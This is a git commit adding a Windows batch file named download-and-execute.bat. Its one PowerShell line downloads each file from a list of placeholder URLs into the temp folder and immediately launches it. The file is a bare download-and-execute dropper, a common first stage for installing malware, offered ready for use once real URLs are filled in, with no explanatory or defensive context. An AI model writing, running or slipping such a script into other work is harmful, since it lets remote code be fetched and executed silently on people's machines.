a301cfc13db92ffd1fe67ff5f73da3d6d78fd495
Mayank Metha D <mayankmethad@gmail.com>
2018-07-04 12:42:33 +0530

    Add files via upload

---
+++ download-and-execute.bat
@@ -0,0 +1,8 @@
+@echo off
+
+set files='url1','url2'
+
+powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+
+
+
